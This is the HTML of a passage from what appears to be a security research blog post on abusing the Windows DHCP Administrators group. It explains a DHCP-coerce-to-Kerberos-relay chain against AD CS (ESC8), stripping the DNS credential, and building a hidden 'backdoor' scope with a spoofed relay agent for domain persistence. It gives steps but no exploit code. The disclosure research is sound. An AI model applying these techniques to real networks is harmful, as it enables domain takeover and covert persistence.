<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-4c16f5d390" data-cmp-data-layer="{&#34;title-4c16f5d390&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:46:00Z&#34;,&#34;dc:title&#34;:&#34;DHCP Coerce to Kerberos relay&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">DHCP Coerce to Kerberos relay<br />
</h2>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-ed095bcaa6&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:49:21Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>DHCP Coerce opens an opportunity for a &lt;a href=\&#34;https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>Kerberos relay&lt;/a> attack — we can coerce authentication to our machine and then perform a relay attack, allowing us to impersonate the DHCP server machine account. This would allow full control over the server itself instead of the more limited permissions included in the DHCP administrators group.&lt;/p>\r\n&lt;p>Kerberos relay targets are somewhat limited, but we still have a good option, as was described in a &lt;a href=\&#34;https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>blog post by Dirk Jan&lt;/a>, Kerberos relay can be used to target Active Directory Certificate Services (AD CS).&lt;/p>\r\n&lt;p>AD CS are a set of services that provide a PKI solution for Active Directory environments. In the context of AD, the main use of this PKI is to enable certificate-based authentication — with AD CS, users can issue certificates for themselves, and use them to authenticate to resources in the domain.&lt;/p>\r\n&lt;p>One of the ways these certificates are issued is the &lt;i>Web Enrollment service&lt;/i> — a web service that can be used by clients to request certificates. By default, this service is vulnerable to Kerberos relay attacks, as it does not verify message integrity. This problem is described as &lt;i>ESC8&lt;/i> in the &lt;a href=\&#34;https://posts.specterops.io/certified-pre-owned-d95910965cd2\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>AD CS research&lt;/a> performed by Will Schroeder and Lee Christensen of SpecterOps.&lt;/p>\r\n&lt;p>By combining our coercion primitive with ESC8, we can create an attack chain (Figure 8) that will enable us to compromise the DHCP server.&lt;/p>\r\n&#34;}}">
    <p>DHCP Coerce opens an opportunity for a <a href="https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html" target="_blank" rel="nofollow noreferrer">Kerberos relay</a> attack — we can coerce authentication to our machine and then perform a relay attack, allowing us to impersonate the DHCP server machine account. This would allow full control over the server itself instead of the more limited permissions included in the DHCP administrators group.</p>
<p>Kerberos relay targets are somewhat limited, but we still have a good option, as was described in a <a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/" target="_blank" rel="nofollow noreferrer">blog post by Dirk Jan</a>, Kerberos relay can be used to target Active Directory Certificate Services (AD CS).</p>
<p>AD CS are a set of services that provide a PKI solution for Active Directory environments. In the context of AD, the main use of this PKI is to enable certificate-based authentication — with AD CS, users can issue certificates for themselves, and use them to authenticate to resources in the domain.</p>
<p>One of the ways these certificates are issued is the <i>Web Enrollment service</i> — a web service that can be used by clients to request certificates. By default, this service is vulnerable to Kerberos relay attacks, as it does not verify message integrity. This problem is described as <i>ESC8</i> in the <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="nofollow noreferrer">AD CS research</a> performed by Will Schroeder and Lee Christensen of SpecterOps.</p>
<p>By combining our coercion primitive with ESC8, we can create an attack chain (Figure 8) that will enable us to compromise the DHCP server.</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="By combining our coercion primitive with ESC8, we can create an attack chain (Figure 8) that will enable us to compromise the DHCP server." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-810d9336d5&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:09:17Z&#34;,&#34;dc:title&#34;:&#34;By combining our coercion primitive with ESC8, we can create an attack chain (Figure 8) that will enable us to compromise the DHCP server.&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;d88e2f1b-5c03-459b-b2d3-44f0547c9f6a&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:52:49Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig8.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig8.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="By combining our coercion primitive with ESC8, we can create an attack chain (Figure 8) that will enable us to compromise the DHCP server."/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 8: DHCP Coerce full attack chain</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-5adb0b926e&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T01:55:23Z&#34;,&#34;xdm:text&#34;:&#34;&lt;ol>\r\n&lt;li>&lt;p>Use a DHCP Administrator to coerce Kerberos authentication to our machine as described in the previous section.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Use &lt;a href=\&#34;https://github.com/dirkjanm/krbrelayx\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>Krbrelayx.py&lt;/a> to relay the authentication to AD CS and get a certificate for the DHCP server machine account.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Use the certificate to obtain the NTLM hash of the DHCP server machine account, a technique described in &lt;a href=\&#34;https://posts.specterops.io/certified-pre-owned-d95910965cd2\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>SpecterOps’s research&lt;/a> as &lt;i>THEFT5&lt;/i>.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;p>Use the NTLM hash to authenticate as the DHCP server machine account and execute code.&lt;/p>\r\n&lt;/li>\r\n&lt;/ol>\r\n&#34;}}">
    <ol>
<li><p>Use a DHCP Administrator to coerce Kerberos authentication to our machine as described in the previous section.</p>
</li>
<li><p>Use <a href="https://github.com/dirkjanm/krbrelayx" target="_blank" rel="nofollow noreferrer">Krbrelayx.py</a> to relay the authentication to AD CS and get a certificate for the DHCP server machine account.</p>
</li>
<li><p>Use the certificate to obtain the NTLM hash of the DHCP server machine account, a technique described in <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2" target="_blank" rel="nofollow noreferrer">SpecterOps’s research</a> as <i>THEFT5</i>.</p>
</li>
<li><p>Use the NTLM hash to authenticate as the DHCP server machine account and execute code.</p>
</li>
</ol>

</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-6a0f09d754&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:40:28Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>For a deeper dive on steps 2–4, please refer to Dirk Jan’s &lt;a href=\&#34;https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>Relaying Kerberos over DNS using krbrelayx and mitm6&lt;/a> blog post.&amp;nbsp;&lt;/p>\r\n&lt;p>To summarize, &lt;b>if AD CS is used in the environment, a DHCP administrator account can execute code on any DHCP server.&lt;/b> Yikes.&lt;/p>\r\n&lt;p>DHCP servers are very often installed on DCs — among the networks that we observed using Microsoft DHCP server, 57% have a DHCP server installed on a DC. In these cases, &lt;b>a DHCP administrator can compromise the entire domain&lt;/b> by taking over the DC machine account.&lt;/p>\r\n&#34;}}">
    <p>For a deeper dive on steps 2–4, please refer to Dirk Jan’s <a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/" target="_blank" rel="nofollow noreferrer">Relaying Kerberos over DNS using krbrelayx and mitm6</a> blog post. </p>
<p>To summarize, <b>if AD CS is used in the environment, a DHCP administrator account can execute code on any DHCP server.</b> Yikes.</p>
<p>DHCP servers are very often installed on DCs — among the networks that we observed using Microsoft DHCP server, 57% have a DHCP server installed on a DC. In these cases, <b>a DHCP administrator can compromise the entire domain</b> by taking over the DC machine account.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-3567ca48f9" data-cmp-data-layer="{&#34;title-3567ca48f9&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:01:26Z&#34;,&#34;dc:title&#34;:&#34;A note on DNS credential&lt;br>\r\n&#34;}}">
    
      <h3 class="cmp-title__text">A note on DNS credential<br />
</h3>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-cafc6bfe4a&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:41:46Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The attack we just described relies on the DHCP server authenticating with its own machine account when performing DNS updates. One of the best practices recommended by Microsoft is to configure a weak user as the &lt;a href=\&#34;/content/akamai/en/blog/security-research/2023/dec/spoofing-dns-by-abusing-dhcp.html#:~:text=misconfigurations%20discussed%20earlier).-,DNS%20credential,-Another%20setting%20that\&#34; target=\&#34;_self\&#34;>DNS credential&lt;/a> for the DHCP server — an alternative credential to be used instead of the machine account when performing updates.&lt;/p>\r\n&lt;p>&lt;b>This configuration could nullify our relay attack.&lt;/b> Instead of compromising the machine account of the server, we will get the permissions of a weak user.&lt;/p>\r\n&lt;p>Luckily for us, we are DHCP administrators! &lt;b>A DHCP administrator can remove an existing DNS credential without any knowledge of the credential itself. &lt;/b>The &lt;i>Remove-DhcpServerDnsCredential&lt;/i> PowerShell command could be used to do this.&amp;nbsp;After removing the DNS credential, the DHCP server reverts to the default and uses its machine account to perform updates.&lt;/p>\r\n&#34;}}">
    <p>The attack we just described relies on the DHCP server authenticating with its own machine account when performing DNS updates. One of the best practices recommended by Microsoft is to configure a weak user as the <a href="/blog/security-research/spoofing-dns-by-abusing-dhcp#:~:text=misconfigurations%2520discussed%2520earlier).-,DNS%2520credential,-Another%2520setting%2520that" target="_self">DNS credential</a> for the DHCP server — an alternative credential to be used instead of the machine account when performing updates.</p>
<p><b>This configuration could nullify our relay attack.</b> Instead of compromising the machine account of the server, we will get the permissions of a weak user.</p>
<p>Luckily for us, we are DHCP administrators! <b>A DHCP administrator can remove an existing DNS credential without any knowledge of the credential itself. </b>The <i>Remove-DhcpServerDnsCredential</i> PowerShell command could be used to do this. After removing the DNS credential, the DHCP server reverts to the default and uses its machine account to perform updates.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-dffe2b91fe" data-cmp-data-layer="{&#34;title-dffe2b91fe&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-22T13:37:07Z&#34;,&#34;dc:title&#34;:&#34;DHCP domain persistence&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">DHCP domain persistence<br />
</h2>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-927eb4d369&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:14:11Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>In addition to abusing the DHCP administrators group to execute code on DHCP servers, the technique that we just described could be weaponized to create an interesting domain persistence mechanism.&lt;/p>\r\n&lt;p>&lt;b>Once the DNS Server option is set up, no credentials are required to coerce authentication — an attacker only needs to lease an IP address from the DHCP server.&lt;/b> This can allow an attacker to perform a DHCP coerce attack &lt;b>from outside the domain &lt;/b>without any credentials.&lt;/p>\r\n&#34;}}">
    <p>In addition to abusing the DHCP administrators group to execute code on DHCP servers, the technique that we just described could be weaponized to create an interesting domain persistence mechanism.</p>
<p><b>Once the DNS Server option is set up, no credentials are required to coerce authentication — an attacker only needs to lease an IP address from the DHCP server.</b> This can allow an attacker to perform a DHCP coerce attack <b>from outside the domain </b>without any credentials.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="dhcp" data-cmp-data-layer="{&#34;dhcp&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T03:13:25Z&#34;,&#34;dc:title&#34;:&#34;DHCP backdoor scope&lt;br />\r\n&#34;}}">
    
      <h3 class="cmp-title__text">DHCP backdoor scope<br />
</h3>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-e17693ef4f&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:09:57Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>A DHCP scope is a defined set of IP addresses in a specific subnet that the DHCP can lease. DHCP options can be configured on a per-scope basis, allowing for different configurations for various subnets.&lt;/p>\r\n&lt;p>To perform a DHCP coerce, we need to change the DNS Server option on one of the DHCP scopes. Obviously, we don&#39;t want to use an existing scope for this — if we modify an existing scope’s DNS Server option, this configuration would be passed down to DHCP clients, causing communication issues and potentially lead to the detection of our backdoor.&lt;/p>\r\n&lt;p>Instead, we want to create a dedicated scope, with an address range that is not used in any subnet of the network (Figure 9).&lt;/p>\r\n&#34;}}">
    <p>A DHCP scope is a defined set of IP addresses in a specific subnet that the DHCP can lease. DHCP options can be configured on a per-scope basis, allowing for different configurations for various subnets.</p>
<p>To perform a DHCP coerce, we need to change the DNS Server option on one of the DHCP scopes. Obviously, we don't want to use an existing scope for this — if we modify an existing scope’s DNS Server option, this configuration would be passed down to DHCP clients, causing communication issues and potentially lead to the detection of our backdoor.</p>
<p>Instead, we want to create a dedicated scope, with an address range that is not used in any subnet of the network (Figure 9).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="We want to create a dedicated scope, with an address range that is not used in any subnet of the network (Figure 9). " class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-690af97781&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:09:25Z&#34;,&#34;dc:title&#34;:&#34;We want to create a dedicated scope, with an address range that is not used in any subnet of the network (Figure 9).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;94cf1234-9cac-4556-b6d2-6d87d28ebb2b&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:12:12Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig9.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig9.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="We want to create a dedicated scope, with an address range that is not used in any subnet of the network (Figure 9). "/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 9: Creating a “backdoor” DHCP scope</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-bd3152760e&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:14:06Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>But there’s a problem with this approach, rooted in the DHCP server scope-selection logic. When a client leases an IP address, the server determines the DHCP scope to use based on the source subnet of the client. This subnet is identified by the network interface that received the DHCP Discover message (Figure 10).&lt;/p>\r\n&#34;}}">
    <p>But there’s a problem with this approach, rooted in the DHCP server scope-selection logic. When a client leases an IP address, the server determines the DHCP scope to use based on the source subnet of the client. This subnet is identified by the network interface that received the DHCP Discover message (Figure 10).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="This subnet is identified by the network interface that received the DHCP Discover message (Figure 10)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-a84aefabc7&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:09:31Z&#34;,&#34;dc:title&#34;:&#34;This subnet is identified by the network interface that received the DHCP Discover message (Figure 10).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;098300c3-b383-48c4-88fb-659dcf746e1c&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:15:31Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig10.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig10.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="This subnet is identified by the network interface that received the DHCP Discover message (Figure 10)."/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 10: DHCP scope-selection based on network interface</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-655b4a0307&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:17:43Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>To trigger the backdoor, we need to lease an IP address from our malicious scope. To do that, we must be present in a subnet that is linked to this scope. At the same time, we want our scope not to be linked to an existing subnet in the network, to avoid breaking client connectivity. These two requirements, however, contradict each other — if a scope is not linked to an existing subnet, we can&#39;t reach it. If it is, other clients can reach it as well. Luckily, DHCP relay agent comes to the rescue.&lt;/p>\r\n&#34;}}">
    <p>To trigger the backdoor, we need to lease an IP address from our malicious scope. To do that, we must be present in a subnet that is linked to this scope. At the same time, we want our scope not to be linked to an existing subnet in the network, to avoid breaking client connectivity. These two requirements, however, contradict each other — if a scope is not linked to an existing subnet, we can't reach it. If it is, other clients can reach it as well. Luckily, DHCP relay agent comes to the rescue.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-4f06c9b6af" data-cmp-data-layer="{&#34;title-4f06c9b6af&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:18:06Z&#34;,&#34;dc:title&#34;:&#34;DHCP relay agent&lt;br>\r\n&#34;}}">
    
      <h4 class="cmp-title__text">DHCP relay agent<br />
</h4>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-b3cb2295a6&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:18:41Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>A solution to this problem comes with the &lt;i>DHCP relay agent feature. &lt;/i>A DHCP relay agent is a server that is meant to allow clients to lease IP addresses from a DHCP server even if one is not present in their local network (Figure 11). &lt;/p>\r\n&#34;}}">
    <p>A solution to this problem comes with the <i>DHCP relay agent feature. </i>A DHCP relay agent is a server that is meant to allow clients to lease IP addresses from a DHCP server even if one is not present in their local network (Figure 11). </p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="A DHCP relay agent is a server that is meant to allow clients to lease IP addresses from a DHCP server even if one is not present in their local network (Figure 11). " class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-623dc22d97&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:09:37Z&#34;,&#34;dc:title&#34;:&#34;A DHCP relay agent is a server that is meant to allow clients to lease IP addresses from a DHCP server even if one is not present in their local network (Figure 11).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;c4e3aa0b-ee7d-4d3f-a465-c67980ce6b25&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:21:17Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig11.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig11.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="A DHCP relay agent is a server that is meant to allow clients to lease IP addresses from a DHCP server even if one is not present in their local network (Figure 11). "/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 11: DHCP lease process with a relay agent</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-d121b81718&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:22:23Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>The relay agent listens to DHCP broadcast messages from clients and relays them to the DHCP server on behalf of the clients. The DHCP relay agent informs the DHCP server of the source subnet of the client via the &lt;i>Relay Agent Information&lt;/i> DHCP option, allowing the server to determine the correct scope to use when leasing an IP address.&lt;/p>\r\n&lt;p>We noticed that this feature enables a DHCP relay agent to request an IP address from any scope, regardless of the interface on the DHCP server. An attacker can act as a relay agent and indicate any subnet in the Relay Agent Information option, enabling them to lease an IP address from any scope (Figure 12).&lt;/p>\r\n&#34;}}">
    <p>The relay agent listens to DHCP broadcast messages from clients and relays them to the DHCP server on behalf of the clients. The DHCP relay agent informs the DHCP server of the source subnet of the client via the <i>Relay Agent Information</i> DHCP option, allowing the server to determine the correct scope to use when leasing an IP address.</p>
<p>We noticed that this feature enables a DHCP relay agent to request an IP address from any scope, regardless of the interface on the DHCP server. An attacker can act as a relay agent and indicate any subnet in the Relay Agent Information option, enabling them to lease an IP address from any scope (Figure 12).</p>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="An attacker can act as a relay agent and indicate any subnet in the Relay Agent Information option, enabling them to lease an IP address from any scope (Figure 12)." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-2761a405a2&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:09:42Z&#34;,&#34;dc:title&#34;:&#34;An attacker can act as a relay agent and indicate any subnet in the Relay Agent Information option, enabling them to lease an IP address from any scope (Figure 12).&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;1f88f354-1be4-496e-b255-81b8bee6d67d&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:24:04Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig12.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
          <img src="/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig12.png" loading="lazy" class="cmp-image__image" itemprop="contentUrl" data-cmp-hook-image="image" alt="An attacker can act as a relay agent and indicate any subnet in the Relay Agent Information option, enabling them to lease an IP address from any scope (Figure 12)."/>
        
        
      </a>
    

    <span class="cmp-image__title" itemprop="caption">Fig. 12: Leasing an IP address from a specified scope by acting as a DHCP relay agent</span>
    
    
  </div>
</div>

    

</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-56236ce673&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:26:25Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>There is one final caveat to consider: The IP address of the relay server itself has to be part of an existing scope on the server. This is meant to prevent rogue clients from accessing the server. To overcome this, we can follow &lt;a href=\&#34;https://learn.microsoft.com/en-us/windows-server/networking/technologies/dhcp/dhcp-subnet-options#:~:text=All%20relay%20agent,from%20being%20assigned.\&#34; target=\&#34;_blank\&#34; rel=\&#34;nofollow noreferrer\&#34;>Microsoft’s recommendation&lt;/a> and create a dedicated scope that will include our external IP address, illegitimately “authorizing” it to act as a relay.&lt;/p>\r\n&#34;}}">
    <p>There is one final caveat to consider: The IP address of the relay server itself has to be part of an existing scope on the server. This is meant to prevent rogue clients from accessing the server. To overcome this, we can follow <a href="https://learn.microsoft.com/en-us/windows-server/networking/technologies/dhcp/dhcp-subnet-options#:~:text=All%20relay%20agent,from%20being%20assigned." target="_blank" rel="nofollow noreferrer">Microsoft’s recommendation</a> and create a dedicated scope that will include our external IP address, illegitimately “authorizing” it to act as a relay.</p>

</div>

    

</div>
<div class="title title__paddingBottom-none aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-title" id="title-6e4d296385" data-cmp-data-layer="{&#34;title-6e4d296385&#34;:{&#34;@type&#34;:&#34;akamai/components/title&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:16:59Z&#34;,&#34;dc:title&#34;:&#34;Abusing the DHCP relay agent option&lt;br>\r\n&#34;}}">
    
      <h2 class="cmp-title__text">Abusing the DHCP relay agent option<br />
</h2>
    
</div>

    


</div>
<div class="text aem-GridColumn aem-GridColumn--default--12">
<div data-cmp-is="text" class="cmp-text" data-cmp-data-layer="{&#34;text-9704bc0065&#34;:{&#34;@type&#34;:&#34;akamai/components/text&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T02:20:27Z&#34;,&#34;xdm:text&#34;:&#34;&lt;p>A potential backdoor (Figure 13) will consist of 2 scopes:&lt;/p>\r\n&lt;ul>\r\n&lt;li>&lt;p>&lt;b>Authorization scope&lt;/b>. A scope that is meant to authorize our attacking machine to act as a DHCP relay agent. Its IP range will include the IP address of our external attacking machine.&lt;/p>\r\n&lt;/li>\r\n&lt;li>&lt;b>Coercion scope&lt;/b>. A scope that will be used to lease an IP address, triggering a Kerberos authentication attempt to our attacking machine. Its DNS Server option would be configured with our external attacking machine IP, and its IP range can be any arbitrary range that is not used in the network. &lt;/li>\r\n&lt;/ul>\r\n&#34;}}">
    <p>A potential backdoor (Figure 13) will consist of 2 scopes:</p>
<ul>
<li><p><b>Authorization scope</b>. A scope that is meant to authorize our attacking machine to act as a DHCP relay agent. Its IP range will include the IP address of our external attacking machine.</p>
</li>
<li><b>Coercion scope</b>. A scope that will be used to lease an IP address, triggering a Kerberos authentication attempt to our attacking machine. Its DNS Server option would be configured with our external attacking machine IP, and its IP range can be any arbitrary range that is not used in the network. </li>
</ul>

</div>

    

</div>
<div class="image aem-GridColumn aem-GridColumn--default--12">
<div class="cmp-image__wrapper  cmp-image-popup  ">
  <div data-cmp-lazy data-title="Our backdoor (Figure 13) will consist of 2 scopes." class="cmp-image " itemscope itemtype="http://schema.org/ImageObject" data-cmp-data-layer="{&#34;image-ca8b630df8&#34;:{&#34;@type&#34;:&#34;akamai/components/image&#34;,&#34;repo:modifyDate&#34;:&#34;2024-03-14T03:09:47Z&#34;,&#34;dc:title&#34;:&#34;Our backdoor (Figure 13) will consist of 2 scopes.&#34;,&#34;image&#34;:{&#34;repo:id&#34;:&#34;b6ae1dcd-1057-47bc-972f-17194e90e2c5&#34;,&#34;repo:modifyDate&#34;:&#34;2024-02-21T02:31:26Z&#34;,&#34;@type&#34;:&#34;image/png&#34;,&#34;repo:path&#34;:&#34;/content/dam/site/en/images/blog/2024/abusing-dhcp-administrators-group-for-privilege-escalation-in-windows-domains-fig13.png&#34;}}}">
    
    
      <a href="javascript:void(0);" class="cmp-image__popup">
        
